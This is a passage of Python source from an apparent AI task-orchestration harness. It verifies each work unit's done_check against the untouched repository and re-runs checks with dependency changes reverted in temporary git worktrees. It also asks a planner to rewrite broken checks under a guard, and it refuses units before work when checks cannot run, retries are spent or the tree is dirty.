    work_record.write_record(record_path, doc)


def _stamp_prechecks(record_path, cwd, runner=None):
    """CHECK DISCRIMINATION (the toy-repo finding, 2026-09-03): BEFORE any
    worker starts on ANY unit, run every not-yet-DONE unit's own done_check
    once, right now, against the untouched repository, and stamp
    `check_passed_before` onto its row: True when the check already passed
    (a unit whose declared work never has to happen for its own check to go
    green cannot be proven by that check, whatever it does later), False
    for the ordinary case, None (NO-DATA) when the check could not even be
    attempted (_check_passes_now's own contract). A row already DONE (a
    resumed run's finished work) is left alone: its check already ran for
    real, once, against actual work, and re-running it here would prove
    nothing new.

    Loads and rewrites the Work document directly, the same load/mutate/
    write shape _mark_integrated already uses just above, rather than
    trusting the caller's in-memory record: that record carries a "path"
    bookkeeping key (run_door's own doc, above) that must never round-trip
    into the file on disk. Returns the freshly stamped rows list, for the
    caller to build the intent screen from without a second read."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    rows = doc.get("rows") or doc.get("units") or []
    for row in rows:
        if row.get("status") == "DONE":
            continue
        capture = {}
        passed, exit_before, looks_broken, _note = _check_passes_now(
            row.get("done_check"), cwd, runner, capture=capture)
        row["check_passed_before"] = passed
        # check_exit_before (rule 4, the zero-context critic, 2026-09-03):
        # the real captured returncode, alongside the True/False/None
        # verdict above, so receipts_for can later tell "fails the same
        # broken way before and after the work" from an ordinary failure
        # that only happened once. Only written when a code was actually
        # captured (the command ran); the exception path leaves it absent,
        # which receipts_for already reads as NO-DATA via check_passed_before
        # itself being None.
        if exit_before is not None:
            row["check_exit_before"] = exit_before
        if looks_broken:
            row["check_looks_broken"] = True
            # THE STDERR THE REWRITE STEP NEEDS (_rewrite_broken_checks,
            # below): the exact text that made this check look broken, so
            # the planner is asked about the real failure rather than a
            # paraphrase of it. Stored only for a broken check; an ordinary
            # failing or passing check has no use for it.
            row["check_stderr_before"] = capture.get("stderr") or ""
    work_record.write_record(record_path, doc)
    # E59: one event for the whole pass, carrying the two counts a reader of
    # the chain needs (how many checks were probed, how many already passed
    # before any work), never the checks themselves, which the document and
    # the intent screen already hold.
    run_dir = os.path.dirname(os.path.abspath(record_path))
    journal.append(run_dir, "precheck.stamped",
                   parent_ids=journal.previous(run_dir),
                   payload={"probed": sum(1 for r in rows
                                          if r.get("status") != "DONE"),
                            "already_passing": sum(
                                1 for r in rows
                                if r.get("check_passed_before") is True)})
    return rows


#: The row field _stamp_dependency_mutations writes and
#: receipt_door.receipts_for reads: one entry per declared dependency,
#: {"unit", "files", "revision", "exit_code", "stderr", "note"}.
CHECK_WITHOUT_FIELD = "check_without_dependencies"


def _first_parent_files(cwd, rev):
    """(files, note): the files `rev` changed against its FIRST parent, or
    (None, why) when git cannot read that range. The fallback
    _stamp_dependency_mutations uses for a dependency row that carries no
    files_changed_by_unit stamp of its own (a row a harness older than E41
    marked DONE); a stamped row is read directly. integrate_one merges a
    lane with --no-ff, so a merged unit's canonical_rev is a merge commit
    whose first parent is the tip the moment before it landed, and a plain
    commit reads the same way through its one parent. A ROOT commit has no
    parent at all (run 7, 2026-09-03: a one-commit target repository, and
    `<sha>^1` failed with "unknown revision"), so it is read against the
    empty tree: its whole tree is its change."""
    try:
        parent = subprocess.run(
            ["git", "rev-parse", "--verify", "--quiet", rev + "^1"], cwd=cwd,
            capture_output=True, text=True, timeout=30)
        if parent.returncode == 0:
            proc = subprocess.run(
                ["git", "diff", "--name-only", rev + "^1", rev], cwd=cwd,
                capture_output=True, text=True, timeout=30)
        else:
            proc = subprocess.run(
                ["git", "diff-tree", "--root", "-r", "--name-only",
                 "--no-commit-id", rev], cwd=cwd,
                capture_output=True, text=True, timeout=30)
    except Exception as exc:  # noqa: BLE001
        return None, "git could not read what %s changed: %s" % (rev[:12], exc)
    if proc.returncode != 0:
        return None, ("git could not read what %s changed: %s"
                      % (rev[:12], (proc.stderr or "").strip()[:160]))
    return [p for p in proc.stdout.splitlines() if p.strip()], ""


def _check_without(cwd, unit_rev, dep_rev, files, command, runner=None,
                   capture=None):
    """(exit_code_or_None, note). Re-runs `command` at `unit_rev` with
    `files` put back to how they stood just before `dep_rev` landed, in a
    throwaway detached worktree that is removed afterwards whatever happens.
    None means the re-run could not be made at all, and `note` says why;
    NO-DATA there is never a pass. Nothing here touches the canonical tree
    or any lane: the worktree is created from and removed through `cwd`'s
    own git, the same way worktree_lane.py's lanes are.

    `capture`, when given a dict, gets `capture["stderr"]` set to the tail of
    the re-run's own stderr, the same seam _check_passes_now already uses for
    the same reason (E42, run 5 critic 3, hole H3, 2026-09-03): receipt_door
    reads that text to tell a check that BROKE with the files reverted from
    one that failed for the behaviour, and re-running the check a second time
    to see its stderr would measure a different moment than the exit code
    stamped here."""
    root = tempfile.mkdtemp(prefix="brother-without-")
    scratch = os.path.join(root, "tree")
    runner = runner or (lambda cmd, **kw: subprocess.run(
        cmd, capture_output=True, text=True, cwd=kw.get("cwd", scratch),
        shell=True, timeout=CHECK_RUN_TIMEOUT_SECONDS))
    try:
        try:
            made = subprocess.run(
                ["git", "worktree", "add", "--detach", scratch, unit_rev],
                cwd=cwd, capture_output=True, text=True, timeout=60)
        except Exception as exc:  # noqa: BLE001
            return None, "a throwaway worktree at %s could not be made: %s" % (
                unit_rev[:12], exc)
        if made.returncode != 0:
            return None, ("a throwaway worktree at %s could not be made: %s"
                          % (unit_rev[:12], (made.stderr or "").strip()[:160]))
        base = dep_rev + "^1"
        for path in files:
            try:
                had = subprocess.run(
                    ["git", "cat-file", "-e", "%s:%s" % (base, path)],
                    cwd=cwd, capture_output=True, text=True, timeout=30)
                if had.returncode == 0:
                    put = subprocess.run(
                        ["git", "checkout", base, "--", path], cwd=scratch,
                        capture_output=True, text=True, timeout=60)
                    if put.returncode != 0:
                        return None, ("%s could not be put back to %s: %s"
                                      % (path, base[:14],
                                         (put.stderr or "").strip()[:160]))
                elif os.path.lexists(os.path.join(scratch, path)):
                    # The dependency CREATED this file: reverting it means
                    # it is not there.
                    os.remove(os.path.join(scratch, path))
            except Exception as exc:  # noqa: BLE001
                return None, "%s could not be put back: %s" % (path, exc)
        try:
            proc = runner(command, cwd=scratch)
        except Exception as exc:  # noqa: BLE001
            return None, ("the check could not be re-run with %s reverted: %s"
                          % (", ".join(files), exc))
        if capture is not None:
            text = (getattr(proc, "stderr", "") or "").strip()
            capture["stderr"] = "\n".join(text.splitlines()[-10:])
        return proc.returncode, ""
    finally:
        # Cleanup must never fail a finished measurement: the verdict above
        # is already decided, and a remnant worktree is a named leftover,
        # not a reason to change it. So both exit codes are READ, and a
        # failure is said once, on stderr, naming the path a person removes
        # by hand: never raised over the verdict, never silent (L11).
        removed = subprocess.run(
            ["git", "worktree", "remove", "--force", scratch], cwd=cwd,
            capture_output=True, text=True, timeout=60)
        pruned = subprocess.run(["git", "worktree", "prune"], cwd=cwd,
                                capture_output=True, text=True, timeout=60)
        if removed.returncode != 0 or pruned.returncode != 0:
            print("brother_run: the throwaway worktree at %s could not be "
                  "fully removed (remove exited %d, prune exited %d: %s); "
                  "the verdict above stands, remove it by hand"
                  % (scratch, removed.returncode, pruned.returncode,
                     ((removed.stderr or "") + (pruned.stderr or ""))
                     .strip()[:160]), file=sys.stderr)
        shutil.rmtree(root, ignore_errors=True)


def _stamp_dependency_mutations(record_path, claims, cwd, log=None,
                                runner=None):
    """THE LAST SELF-CERTIFICATION HOLE THE CRITICS COULD NAME (EVAD run 4
    trial 2, 2026-09-03, on the toy's run 5): the test unit's check exited 5
    before the work and 0 after, so every rule above it read PASS, and the
    estate's evidence auditor then showed the delivered test passes with the
    guard it covers DELETED, because stock Python already raises TypeError
    for "2" + 3. A check that discriminates its own existence but not the
    change it claims to cover must read NO-DATA from the ENGINE, not from a
    human audit.

    THE MECHANISM, chosen from three: (a) revert the unit named in
    depends_on to its before-revision in a throwaway worktree at this unit's
    own integrated revision and re-run this unit's check there; (b) revert
    every non-test file the whole run changed and re-run; (c) make the
    planner declare a `covers` field and refuse a test unit that names
    nothing. (a) is built. (b) was rejected because with everything reverted
    at once the receipt can only say "some file", never WHICH change the
    check fails to exercise, and it also unwinds work the unit never claimed
    to depend on, so a green there proves nothing anyone asked. (c) was
    rejected as a SECOND field because depends_on already IS the planner's
    declaration of what a unit builds on (work_record.py validates it,
    graph_loop.py schedules by it), and a second field carrying the same
    fact is a second place for the two to disagree. What (c) was asking for
    landed on depends_on itself (E40, run 5 critic 3, 2026-09-03, which
    caught this docstring claiming the intent screen showed the declaration
    when it listed title and done_check only): a test-only unit that names
    no non-test unit beside a code unit is refused before any claim
    (_uncovered_test_unit_line), every unit's depends_on is printed on the
    intent screen and in the intent resolution line, and a unit that
    declares no dependency carries "no dependency declared: this check
    proves its own change only" on its receipt (receipt_door's
    dependency_note).

    For every DONE row with a non-empty depends_on: one entry per dependency
    under CHECK_WITHOUT_FIELD, {"unit", "files", "revision", "exit_code",
    "note"}, where `files` is what the dependency itself changed (its own
    files_changed_by_unit stamp, E41; its integrated revision against its
    first parent only for a row stamped by an older harness), `revision` is this
    unit's own integrated revision the re-run happened at, `exit_code` is
    the real captured returncode of this unit's check with those files
    reverted (0 means the check does not need that change), `stderr` is the
    tail of what that re-run printed on stderr (E42: receipt_door reads it to
    tell a check that BROKE with the files reverted from one that failed for
    the behaviour), and None with a `note` means the re-run could not be
    made. receipt_door.receipts_for
    reads exactly this and nothing else. Idempotent: a row already stamped
    (a resumed run) is left alone; a row with no dependency gets nothing,
    and reads exactly as it did before this existed."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    rows = doc.get("rows") or doc.get("units") or []
    by_id = {r.get("id"): r for r in rows}
    stamped, touched = {}, False

    def _rev_of(uid):
        claim = (claims or {}).get(uid) or {}
        evidence = claim.get("evidence") if isinstance(
            claim.get("evidence"), dict) else {}
        return str(evidence.get("canonical_rev") or "").strip()

    for row in rows:
        uid = row.get("id")
        deps = [str(d) for d in (row.get("depends_on") or [])]
        if row.get("status") != "DONE" or not deps:
            continue
        if CHECK_WITHOUT_FIELD in row:
            continue
        unit_rev = _rev_of(uid)
        command = str(row.get("done_check") or "").strip()
        entries = []
        for dep in deps:
            dep_rev = _rev_of(dep)
            dep_files = (by_id.get(dep) or {}).get("files_changed_by_unit")
            files, code, note, stderr = [], None, "", ""
            if isinstance(dep_files, list) and not dep_files:
                # THE DEPENDENCY CHANGED NOTHING (run 7, 2026-09-03): its
                # own per-unit list is empty, so there is nothing to revert
                # and a re-run would measure nothing; git is not asked at
                # all. The receipt reads this note back verbatim.
                note = receipt_door.NO_FILE_DEPENDENCY % dep
            elif not unit_rev:
                note = "this unit's own integrated revision is not recorded"
            elif not dep_rev:
                note = "%s's integrated revision is not recorded" % dep
            elif not command:
                note = "no done_check was recorded for this unit"
            else:
                if isinstance(dep_files, list):
                    # The dependency's OWN files, as its row was stamped at
                    # its own merge (E41); the git read is only for a row
                    # a harness older than that stamp marked DONE.
                    files, note = [str(p) for p in dep_files], ""
                else:
                    files, note = _first_parent_files(cwd, dep_rev)
                if files is None:
                    files = []
                elif not files:
                    note = receipt_door.NO_FILE_DEPENDENCY % dep
                else:
                    seen = {}
                    code, note = _check_without(cwd, unit_rev, dep_rev, files,
                                                command, runner, capture=seen)
                    stderr = seen.get("stderr", "")
            entries.append({"unit": dep, "files": files, "revision": unit_rev,
                            "exit_code": code, "stderr": stderr, "note": note})
            if log is None:
                continue
            if not files:
                log.note("brother_run: %s's check was not re-run with %s's "
                         "change reverted: %s" % (uid, dep, note))
            else:
                log.note("brother_run: %s's check re-run at %s with %s's "
                         "change to %s reverted: %s"
                         % (uid, unit_rev[:12] or NODATA, dep,
                            ", ".join(files),
                            "exited %d" % code if code is not None
                            else "%s, %s" % (NODATA, note)))
        row[CHECK_WITHOUT_FIELD] = entries
        stamped[uid] = entries
        touched = True
    if touched:
        work_record.write_record(record_path, doc)
    return stamped


def _stamp_review_findings(record_path, claims, cwd, log=None, cmd=None):
    """S32 (docs/plan/REVIEW-DEPTH-DESIGN-2026-09-05.md): every DONE unit
    whose OWN DIFF crosses a risk boundary is read by one of the seven
    existing read-only reviewer agents, and every finding that reviewer
    returns has its own verification command RE-EXECUTED here, so the
    receipt records a finding beside a real exit code.

    THE SAME SHAPE AS _stamp_dependency_mutations ABOVE, deliberately: load
    the document on disk, stamp a field onto the rows, write it back, and
    let receipt_door read that field and nothing else. That precedent is why
    this needs no new screen, no new command and no change to the merge:
    the pass runs after the drain, on work that has already landed, and
    NOTHING here can change an exit code. A finding cannot block a merge,
    which is a weakness against a competitor that reviews before it commits,
    named plainly in the design's section 6 with the evidence that would
    flip it.

    Idempotent, for the same reason its sibling is: a row already carrying
    the field is left alone, so a resumed run does not pay a second reviewer
    for work it already read.

    The whole pass is NO-DATA rather than an exception on every boundary it
    crosses (no reviewer configured, an unreadable diff, a reviewer that
    cannot run, an answer that does not parse), because a delivery that
    could not be reviewed must never read like one that was reviewed and
    came back clean."""
    try:
        import review_pass
    except ImportError as exc:
        if log is not None:
            log.note("brother_run: %s: the review pass is not importable, so "
                     "no unit was read by an independent reviewer: %s"
                     % (NODATA, exc))
        return {}
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    rows = doc.get("rows") or doc.get("units") or []
    try:
        stamps = review_pass.review_rows(rows, claims, cwd, cmd=cmd)
    except (OSError, ValueError) as exc:
        if log is not None:
            log.note("brother_run: %s: the review pass could not run: %s"
                     % (NODATA, exc))
        return {}
    if not stamps:
        return {}
    for row in rows:
        stamp = stamps.get(row.get("id"))
        if stamp is None:
            continue
        row[receipt_door.REVIEW_FIELD] = stamp
        if log is None:
            continue
        if stamp.get("state") != "ran":
            log.note("brother_run: %s was not reviewed: %s"
                     % (row.get("id"), stamp.get("state")))
            continue
        log.note("brother_run: %s (%s, class %s) was reviewed by %s: "
                 "%d finding(s), %d confirmed by a check this run re-ran"
                 % (row.get("id"), stamp.get("tier"), stamp.get("class"),
                    stamp.get("reviewer"), len(stamp.get("findings") or []),
                    len([f for f in stamp.get("findings") or []
                         if f.get("state")
                         == receipt_door.FINDING_CONFIRMED])))
    work_record.write_record(record_path, doc)
    return stamps


#: How many times a unit whose check _stamp_prechecks marked
#: check_looks_broken is asked about again, once, before falling through to
#: _refuse_broken_precheck_units unchanged. ONE: a check the planner cannot
#: fix with the exact stderr it produced in front of it is reported broken,
#: not argued with round after round.
MAX_CHECK_REWRITE_ATTEMPTS = 1

#: How many EXTRA asks a unit gets when its replacement parsed fine but
#: door.guard_adopted_check refused it (a `;`, a pipe, an interpreter off
#: the allowlist). ONE: measured live in two independent 2026-09-04 trials
#: (docs/plan/runs/decomposition-adversity-2026-09-04/trial1,
#: docs/plan/runs/live-autonomous-adversity-2026-09-04/trial1), the outcome
#: phrasing "raises X with a clear message" produced a replacement carrying
#: a `;`, it was refused, and nothing was said back to the planner. This is
#: separate from MAX_CHECK_REWRITE_ATTEMPTS above, which counts asks about a
#: check that RAN and was broken; a guard refusal means the reply never ran
#: at all, and the refusal reason is new information the planner did not
#: have on the first ask.
MAX_CHECK_GUARD_REFUSAL_RETRIES = 1


def _ask_planner_for_replacement_check(cmd, objective, original, stderr_text,
                                       uid, log):
    """One unit's whole replacement conversation, up to
    1 + MAX_CHECK_GUARD_REFUSAL_RETRIES asks. Returns the guarded
    replacement command, or None when this unit keeps its original check
    (which then falls through to _refuse_broken_precheck_units and refuses
    THIS unit alone; every other unit in the document is untouched).

    A reply that is not valid JSON, not a JSON object, or whose done_check
    is empty ends the conversation immediately: nothing about it says what
    a second ask should do differently. A reply that parses but is REFUSED
    by door.guard_adopted_check is different, and is the E88 case: the
    refusal names a rule the planner can obey, so it is quoted back and one
    more ask is made. The refused COMMAND is never logged or quoted (it came
    from the same untrusted reply), only the reason."""
    refusal_reason = None
    for attempt in range(1 + MAX_CHECK_GUARD_REFUSAL_RETRIES):
        prompt = door.build_check_rewrite_prompt(
            objective, original, stderr_text, refusal_reason=refusal_reason)
        log.note("brother_run: asking the planner for a replacement "
                 "done_check for %s (ask %d of %d)"
                 % (uid, attempt + 1, 1 + MAX_CHECK_GUARD_REFUSAL_RETRIES))
        try:
            proc = door.ask_decomposer(cmd, prompt)
        except (OSError, subprocess.TimeoutExpired) as exc:
            log.note("brother_run: the planner could not be asked for a "
                     "replacement done_check for %s: %s; keeping the "
                     "original check" % (uid, exc))
            return None
        try:
            raw = json.loads(door.strip_code_fences(proc.stdout))
        except ValueError as exc:
            log.note("brother_run: %s's replacement done_check could not "
                     "be read as JSON, keeping the original: %s"
                     % (uid, exc))
            return None
        if not isinstance(raw, dict):
            log.note("brother_run: %s's replacement was not a JSON "
                     "object, keeping the original" % uid)
            return None
        new_check = str(raw.get("done_check") or "").strip()
        if not new_check:
            log.note("brother_run: %s's replacement named no done_check, "
                     "keeping the original" % uid)
            return None
        resolved, note = door.resolve_done_check_interpreter(new_check)
        if note:
            new_check = resolved
            log.note("door: %s" % note)
        # E78: the planner's reply is untrusted text; refuse it before it
        # ever becomes this row's done_check rather than filter what runs.
        # The refusal names the unit and the rule broken, never the command.
        allowed, refusal_reason = door.guard_adopted_check(new_check)
        if allowed:
            return new_check
        log.note("brother_run: refusing %s's replacement done_check (%s)"
                 % (uid, refusal_reason))
    log.note("brother_run: %s's replacement done_check was refused on every "
             "ask; keeping the original, so this unit alone is refused "
             "before any worker starts" % uid)
    return None


def _rewrite_broken_checks(record_path, cwd, log, runner=None, model_cmd=None):
    """THE FIX (rule 4 follow-through, the zero-context critic, 2026-09-03):
    measured live, the planner asked by door.py for "a single shell command
    that exits 0 once the unit is done" twice wrote a multi-line `python3
    -c "..."` check with literal backslash-n sequences inside the string, a
    syntax error before AND after the work, so _stamp_prechecks stamps
    check_looks_broken and _refuse_broken_precheck_units refuses the unit
    outright. Refusing is honest but wasteful when one more question to the
    SAME planner, carrying the exact stderr the broken check produced,
    would yield a runnable check.

    Runs strictly between those two (both above): every row here has
    already been stamped check_looks_broken by _stamp_prechecks, and
    whatever is still broken after this returns falls through to
    _refuse_broken_precheck_units exactly as it did before this fix, same
    wording, same reason. Never asks the planner more than
    MAX_CHECK_REWRITE_ATTEMPTS (1) time per unit about a check that RAN and
    was broken; a reply REFUSED by door.guard_adopted_check never ran at
    all, and gets MAX_CHECK_GUARD_REFUSAL_RETRIES (1) further ask with the
    refusal reason quoted back (E88, see
    _ask_planner_for_replacement_check).

    Reuses door.py's own decomposer plumbing wholesale rather than a second
    implementation of any of it: resolve_cmd (so this obeys the same
    DOOR_MODEL_CMD environment variable and `claude -p` default door.py's
    own CLI does), missing_reason, ask_decomposer (the same model and the
    same timeout door.py calls it with), strip_code_fences and
    resolve_done_check_interpreter. `model_cmd`, when given, is passed
    straight through to door.resolve_cmd, exactly like door.py's own
    --model-cmd.

    A reply that is not valid JSON, not a JSON object, or whose done_check
    is empty REFUSES THE REPLY, not the unit: the original done_check is
    left in place, untouched, and the unit falls through unchanged. A
    replacement that parses is ADOPTED regardless of whether it still
    looks broken afterward (re-stamped with the same _check_passes_now this
    module already uses for the first pass), and the row records
    `check_rewritten: true` with the pre-rewrite command kept verbatim as
    `check_original`, so the report and every receipt can still show what
    the planner originally wrote.

    Returns the (possibly rewritten) rows list, freshly read from disk."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    key = "rows" if "rows" in doc else "units"
    rows = doc.get(key) or []
    broken = [r for r in rows if r.get("status") != "DONE"
             and r.get("check_looks_broken")]
    if not broken:
        return rows
    cmd = door.resolve_cmd(model_cmd)
    missing = door.missing_reason(cmd)
    if missing:
        log.note("brother_run: no decomposer is available to ask for a "
                 "replacement done_check (%s); %d broken check(s) stay "
                 "as they are" % (missing, len(broken)))
        return rows
    touched = False
    for row in broken:
        uid = row.get("id")
        original = str(row.get("done_check") or "")
        stderr_text = row.get("check_stderr_before") or ""
        new_check = _ask_planner_for_replacement_check(
            cmd, row.get("objective") or row.get("title") or "", original,
            stderr_text, uid, log)
        if not new_check:
            continue
        capture = {}
        passed, exit_before, looks_broken, _note = _check_passes_now(
            new_check, cwd, runner, capture=capture)
        row["check_original"] = original
        row["done_check"] = new_check
        row["check_rewritten"] = True
        row["check_passed_before"] = passed
        if exit_before is not None:
            row["check_exit_before"] = exit_before
        row["check_looks_broken"] = bool(looks_broken)
        if looks_broken:
            row["check_stderr_before"] = capture.get("stderr") or ""
        else:
            row.pop("check_stderr_before", None)
        touched = True
        log.note("brother_run: rewrote %s's done_check after asking the "
                 "planner once (%s)" % (
                     uid, "still looks broken" if looks_broken
                     else "now runnable"))
        # E59: the check a receipt will later quote is not the one the
        # planner first wrote, and this is the event that says so. The two
        # commands themselves stay on the row (check_original beside
        # done_check); the journal records that the swap happened.
        run_dir = os.path.dirname(os.path.abspath(record_path))
        journal.append(run_dir, "check.rewritten",
                       parent_ids=journal.previous(run_dir), unit_id=uid,
                       payload={"still_looks_broken": bool(looks_broken)})
    if touched:
        work_record.write_record(record_path, doc)
    return rows


def _refuse_broken_precheck_units(record_path):
    """THE FIX (rule 4 follow-through, the zero-context critic, 2026-09-03):
    a unit _stamp_prechecks marked `check_looks_broken` is pulled out of the
    Work document ON DISK, before any round of the drain runs, so
    loop_bridge's own scheduler, which reads this same file fresh every
    round, never sees it and never claims it. Measured live: a unit whose
    check was a syntax error still got dispatched, its worker spent up to
    the full 1200 second timeout twice, and the caller's own timeout hit
    before the loop ever gave up on its own. A check that cannot run cannot
    prove any worker's output, whatever that worker does.

    Returns {unit_id: (row, reason)} for the caller to restore once the
    drain is over, so the delivery report and every receipt still accounts
    for the unit this pulled out. Never touches a row already DONE (its
    check ran for real, once, against actual work)."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    key = "rows" if "rows" in doc else "units"
    kept, refused = [], {}
    for row in doc.get(key) or []:
        if row.get("status") != "DONE" and row.get("check_looks_broken"):
            exit_before = row.get("check_exit_before")
            reason = ("its check cannot run (exit %s before the work, "
                      "stderr matches a pattern that means it never ran at "
                      "all rather than an ordinary failing assertion), so "
                      "nothing could prove this unit; fix the check and run "
                      "again" % (exit_before if exit_before is not None
                                 else NODATA))
            row["integration_refused"] = reason
            # The stamp build_report reads to tell "refused before any
            # worker started" from a verifier's later refusal; see
            # _refuse_exhausted_units for the other writer of it.
            row["refused_before_work"] = True
            refused[row.get("id")] = (row, reason)
            # E59: the reason is long and already lives on the row, so the
            # event carries the STAGE instead, which is what a chain needs to
            # tell this refusal from the verifier's later one.
            run_dir = os.path.dirname(os.path.abspath(record_path))
            journal.append(run_dir, "unit.refused",
                           parent_ids=journal.previous(run_dir),
                           unit_id=row.get("id"),
                           payload={"stage": "before any worker started",
                                    "why": "its check cannot run"})
            _write_capsule(run_dir)
        else:
            kept.append(row)
    if refused:
        doc[key] = kept
        work_record.write_record(record_path, doc)
    return refused


def _refuse_exhausted_units(record_path, claims_path):
    """A RESUMED RUN RE-RUNS AN ABANDONED CLAIM, UP TO THE BOUND (the toy's
    run 4, 2026-09-03). claim_store.acquire() already hands a dead owner's
    unit to the next claimant with the attempt count carried over (its
    reconcile() names the claim abandoned first), so a unit whose claim
    the crashed run left in state claimed IS re-run by the next round of
    the drain with no help from here. What nothing bounded was the
    carry-over: loop_bridge claims every dispatchable unit whatever its
    attempt number, and MAX_UNIT_ATTEMPTS only governs whether the drain
    goes on, so a run resumed after three abandoned attempts would spend a
    fourth (the killed run's own claims.json held the guard at attempt 3,
    reclaimed from an earlier owner). This pulls every not-DONE row whose
    latest claim is still in state "claimed" (abandoned: the owner died
    before releasing it) and already used MAX_UNIT_ATTEMPTS attempts out of
    the plan on disk, before the drain, exactly the way
    _refuse_broken_precheck_units pulls a broken check, and with the same
    return shape, so one restore (_restore_refused_precheck_units) folds
    both back into the report. A fresh run has no claims.json yet and this
    is a no-op.

    A RELEASED FAILURE IS NOT PULLED, whatever its attempt count. The drain
    already judged it (the forcing-condition screen told the person the
    budget was spent and the run stopped), so a resume is that person's
    deliberate retry after changing something: the acceptance harness's
    area 6 commits the unrelated edit integration refused over and resumes,
    and the unit must land. The drain's own progress rule still bounds that
    retry to one more attempt past the cap, as it always did."""
    claims = _read_claims(claims_path)
    if not claims:
        return {}
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    key = "rows" if "rows" in doc else "units"
    kept, refused = [], {}
    for row in doc.get(key) or []:
        claim = claims.get(row.get("id")) or {}
        attempts = claim.get("attempt") if isinstance(claim, dict) else None
        spent = (row.get("status") != "DONE"
                 and isinstance(attempts, int) and not isinstance(attempts, bool)
                 and attempts >= MAX_UNIT_ATTEMPTS
                 and str(claim.get("state", "")) == "claimed")
        if spent:
            reason = ("it was already given %d attempt(s) across the run(s) "
                      "this one resumed and never finished (its last claim "
                      "ended %s); the retry budget of %d is spent, so it was "
                      "not claimed again" % (attempts, claim.get("state"),
                                             MAX_UNIT_ATTEMPTS))
            row["integration_refused"] = reason
            row["refused_before_work"] = True
            refused[row.get("id")] = (row, reason)
            # E59: the other refusal before any worker starts (see
            # _refuse_broken_precheck_units above), told apart by its own why.
            run_dir = os.path.dirname(os.path.abspath(record_path))
            journal.append(run_dir, "unit.refused",
                           parent_ids=journal.previous(run_dir),
                           unit_id=row.get("id"),
                           payload={"stage": "before any worker started",
                                    "why": "the retry budget is spent",
                                    "attempts": attempts})
            _write_capsule(run_dir)
        else:
            kept.append(row)
    if refused:
        doc[key] = kept
        work_record.write_record(record_path, doc)
    return refused


def _stamp_harness(record_path, field, revision, overwrite):
    """Write `revision` under `field` on the Work document ON DISK (the
    load/mutate/write shape _mark_integrated uses) and return the document
    afterwards. Two fields, two rules: `harness_revision` is the engine
    that CREATED the record, written once at run start and never
    overwritten (overwrite=False leaves an existing value alone), so a
    resumed record always still names the engine whose prechecks and plan
    it carries; `harness_revision_resumed` is the engine that RESUMED it,
    written on every resume (overwrite=True, latest wins) because it names
    the engine producing the receipt a reader is holding. A record created
    before this stamp existed keeps no creator: NO-DATA there is the truth,
    never the resumer's sha standing in for it."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    if overwrite or not doc.get(field):
        doc[field] = revision
        work_record.write_record(record_path, doc)
    return doc


def _path_overlaps(dirty, owned):
    """True when a dirty path and an owned path name the same file or one
    lies under the other (an owned directory, or an untracked directory
    git status lists with a trailing slash)."""
    a, b = str(dirty).strip("/"), str(owned).strip("/")
    return bool(a) and bool(b) and (
        a == b or a.startswith(b + "/") or b.startswith(a + "/"))


def _dirty_tree_lines(cwd, rows):
    """(refusal, notice), at most one of them non-empty, for a target tree
    that is not clean by integrate.py's own rule (integrate.dirty_paths:
    bytecode never counts). The clean-tree prerequisite stood in prose on
    the intent screen and the README while integrate.py enforced it only at
    merge time, after every worker had spent its attempts (EVAD run 4 named
    it "a setup tax on the first try"); checked here before anything is
    claimed, once the door has said which paths this run will write.

    EVERY KIND OF DIRT IS REFUSED HERE, and the second kind was not until
    the founder's 2026-09-05 public run paid for it. Dirt INSIDE the run's
    write set (it overlaps a not-DONE unit's `owns`) is somebody's
    uncommitted work a merge of that unit would bury, and its line names the
    unit that owns each path. Dirt OUTSIDE the write set used to be a NOTICE
    and the run proceeded, on the reasoning that integrate.py would refuse
    the merge later and name it. It does, and that is the defect: later is
    after every worker has spent its attempts. Measured on the public 1.0.5
    run, where two setup files no unit owned let three worker attempts run
    and pass their own done checks before integration refused every one of
    them, and the receipt reported changed=[] with nothing touched. Nobody's
    edit is buried either way: this refuses before anything is claimed and
    writes no path. A tree status cannot be read for is refused, never
    guessed clean. Both branches return the refusal, and the notice slot
    stays empty rather than changing every caller's shape."""
    paths = integrate.dirty_paths(cwd)
    if paths is None:
        return ("brother_run: git status could not read the repository at "
                "%s, so nothing was claimed or run" % cwd), ""
    if not paths:
        return "", ""
    owned = [(row.get("id"), own) for row in rows
             if row.get("status") != "DONE"
             for own in (row.get("owns") or [])]
    hits = []
    for path in paths:
        uid = next((uid for uid, own in owned if _path_overlaps(path, own)),
                   None)
        if uid is not None:
            hits.append((path, uid))
    if hits:
        shown = ", ".join("%s (owned by %s)" % (p, u) for p, u in hits[:3])
        shown += ", ..." if len(hits) > 3 else ""
        return ("brother_run: the repository at %s is dirty inside this "
                "run's write set: %d uncommitted path(s) a unit owns (%s); "
                "commit or stash them first, nothing was claimed or run. "
                "A tracked modification and an untracked file both count "
                "here; only interpreter bytecode (__pycache__/, .pyc, .pyo) "
                "never does"
                % (cwd, len(hits), shown)), ""
    shown = ", ".join(paths[:3]) + (", ..." if len(paths) > 3 else "")
    return ("brother_run: the repository at %s is dirty on %d uncommitted "
            "path(s) outside this run's write set (%s); commit or remove "
            "them first, nothing was claimed or run. They are left "
            "untouched. Integration refuses to merge over a dirty tree, so "
            "a run started here spends every worker attempt and then "
            "refuses every unit. A tracked modification and an untracked "
            "file both count here; only interpreter bytecode "
            "(__pycache__/, .pyc, .pyo) never does"
            % (cwd, len(paths), shown)), ""


def _restore_refused_precheck_units(record_path, refused, order):
    """Folds the rows _refuse_broken_precheck_units pulled out of the plan
    back into the Work document on disk, once the drain is over and nothing
    can claim them anymore, at their original position (`order`, the row
    ids as this run first read them), so the delivery report and every
    receipt still lists every unit the run started with, in the order it
    started with them."""
    if not refused:
        return
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    key = "rows" if "rows" in doc else "units"
    by_id = {r.get("id"): r for r in doc.get(key) or []}
    for uid, (row, _reason) in refused.items():
        by_id[uid] = row
    doc[key] = [by_id[uid] for uid in order if uid in by_id]
    work_record.write_record(record_path, doc)


def _is_test_path(path):
    """A path the coverage rule treats as a test file: its basename starts
    with test_ or ends in _test.py, or it sits under a tests/ directory."""
    parts = [p for p in str(path).replace("\\", "/").split("/") if p]
    if "tests" in parts[:-1]:
